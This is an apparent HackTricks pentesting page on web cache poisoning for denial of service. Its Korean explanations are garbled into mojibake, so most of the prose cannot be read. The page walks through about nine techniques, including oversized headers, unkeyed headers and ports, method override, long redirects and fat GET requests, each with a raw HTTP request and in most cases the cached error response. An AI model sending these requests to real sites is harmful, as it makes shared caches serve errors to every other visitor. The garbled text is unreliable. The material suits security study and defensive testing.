# Cache Poisoning to DoS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="danger" %}
ì´ í˜ì´ì§€ì—ì„œëŠ” **ìºì‹œ ì„œë²„ì— ìœ íš¨í•œ** ìš”ì²­ì— ëŒ€í•´ **ì›¹ ì„œë²„ê°€ ì˜¤ë¥˜ë¡œ ì‘ë‹µí•˜ë„ë¡** ì‹œë„í•  ìˆ˜ ìˆëŠ” ë‹¤ì–‘í•œ ë³€í˜•ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

* **HTTP Header Oversize (HHO)**

ì›¹ ì„œë²„ê°€ ì§€ì›í•˜ëŠ” ê²ƒë³´ë‹¤ í° í—¤ë” í¬ê¸°ë¡œ ìš”ì²­ì„ ë³´ë‚´ë˜, ìºì‹œ ì„œë²„ê°€ ì§€ì›í•˜ëŠ” ê²ƒë³´ë‹¤ ì‘ì€ í¬ê¸°ë¡œ ë³´ëƒ…ë‹ˆë‹¤. ì›¹ ì„œë²„ëŠ” ìºì‹œë  ìˆ˜ ìˆëŠ” 400 ì‘ë‹µìœ¼ë¡œ ì‘ë‹µí•  ê²ƒì…ë‹ˆë‹¤:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP ë©”íƒ€ ë¬¸ì (HMC) ë° ì˜ˆìƒì¹˜ ëª»í•œ ê°’**

í•´ë‹¹ ê³µê²©ì´ ì‘ë™í•˜ë ¤ë©´ ë¨¼ì € ìºì‹œë¥¼ ìš°íšŒí•´ì•¼ í•©ë‹ˆë‹¤. í•´ë¡œìš´ ë©”íƒ€ ë¬¸ìê°€ í¬í•¨ëœ í—¤ë”ë¥¼ ì „ì†¡í•˜ì‹­ì‹œì˜¤.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
A badly configured header could be just `\:` as a header.

ì´ê²ƒì€ ì˜ˆìƒì¹˜ ëª»í•œ ê°’ì´ ì „ì†¡ë  ê²½ìš°ì—ë„ ì‘ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ì˜ˆìƒì¹˜ ëª»í•œ Content-Type:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Unkeyed header**

ì¼ë¶€ ì›¹ì‚¬ì´íŠ¸ëŠ” ìš”ì²­ì— íŠ¹ì • í—¤ë”ê°€ í¬í•¨ë˜ì–´ ìˆìœ¼ë©´ ì˜¤ë¥˜ ìƒíƒœ ì½”ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ _X-Amz-Website-Location-Redirect: someThing_ í—¤ë”ê°€ ìˆìŠµë‹ˆë‹¤:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTP ë©”ì„œë“œ ì˜¤ë²„ë¼ì´ë“œ ê³µê²© (HMO)**

ì„œë²„ê°€ `X-HTTP-Method-Override`, `X-HTTP-Method` ë˜ëŠ” `X-Method-Override`ì™€ ê°™ì€ í—¤ë”ë¡œ HTTP ë©”ì„œë“œë¥¼ ë³€ê²½í•˜ëŠ” ê²ƒì„ ì§€ì›í•˜ëŠ” ê²½ìš°, ë©”ì„œë“œë¥¼ ë³€ê²½í•˜ì—¬ ìœ íš¨í•œ í˜ì´ì§€ë¥¼ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ ì„œë²„ê°€ ì´ë¥¼ ì§€ì›í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ ì˜ëª»ëœ ì‘ë‹µì´ ìºì‹œë©ë‹ˆë‹¤:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **í‚¤ê°€ ì—†ëŠ” í¬íŠ¸**

Host í—¤ë”ì˜ í¬íŠ¸ê°€ ì‘ë‹µì— ë°˜ì˜ë˜ê³  ìºì‹œ í‚¤ì— í¬í•¨ë˜ì§€ ì•ŠëŠ” ê²½ìš°, ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” í¬íŠ¸ë¡œ ë¦¬ë””ë ‰ì…˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Long Redirect DoS**

ë‹¤ìŒ ì˜ˆì™€ ê°™ì´, xëŠ” ìºì‹œë˜ì§€ ì•Šìœ¼ë¯€ë¡œ ê³µê²©ìëŠ” ë¦¬ë””ë ‰ì…˜ ì‘ë‹µ ë™ì‘ì„ ì•…ìš©í•˜ì—¬ ë¦¬ë””ë ‰ì…˜ì´ ë„ˆë¬´ í° URLì„ ë³´ë‚´ë„ë¡ ë§Œë“¤ì–´ ì˜¤ë¥˜ë¥¼ ë°˜í™˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ uncached x í‚¤ ì—†ì´ URLì— ì ‘ê·¼í•˜ë ¤ëŠ” ì‚¬ëŒë“¤ì€ ì˜¤ë¥˜ ì‘ë‹µì„ ë°›ê²Œ ë©ë‹ˆë‹¤:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **í˜¸ìŠ¤íŠ¸ í—¤ë” ëŒ€ì†Œë¬¸ì ì •ê·œí™”**

í˜¸ìŠ¤íŠ¸ í—¤ë”ëŠ” ëŒ€ì†Œë¬¸ìë¥¼ êµ¬ë¶„í•˜ì§€ ì•Šì•„ì•¼ í•˜ì§€ë§Œ ì¼ë¶€ ì›¹ì‚¬ì´íŠ¸ëŠ” ì†Œë¬¸ìë¡œ ë˜ì–´ ìˆê¸°ë¥¼ ê¸°ëŒ€í•˜ë©° ê·¸ë ‡ì§€ ì•Šì„ ê²½ìš° ì˜¤ë¥˜ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **ê²½ë¡œ ì •ê·œí™”**

ì¼ë¶€ í˜ì´ì§€ëŠ” ê²½ë¡œì— ë°ì´í„° URL ì¸ì½”ë”©ì„ ë³´ë‚´ë©´ ì˜¤ë¥˜ ì½”ë“œë¥¼ ë°˜í™˜í•˜ì§€ë§Œ, ìºì‹œ ì„œë²„ëŠ” ê²½ë¡œë¥¼ URL ë””ì½”ë”©í•˜ê³  URL ë””ì½”ë”©ëœ ê²½ë¡œì— ëŒ€í•œ ì‘ë‹µì„ ì €ì¥í•©ë‹ˆë‹¤:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

ì¼ë¶€ ìºì‹œ ì„œë²„, ì˜ˆë¥¼ ë“¤ì–´ Cloudflare ë˜ëŠ” ì›¹ ì„œë²„ëŠ” ë³¸ë¬¸ì´ ìˆëŠ” GET ìš”ì²­ì„ ì¤‘ë‹¨í•˜ë¯€ë¡œ, ì´ë¥¼ ì•…ìš©í•˜ì—¬ ì˜ëª»ëœ ì‘ë‹µì„ ìºì‹œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## References

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
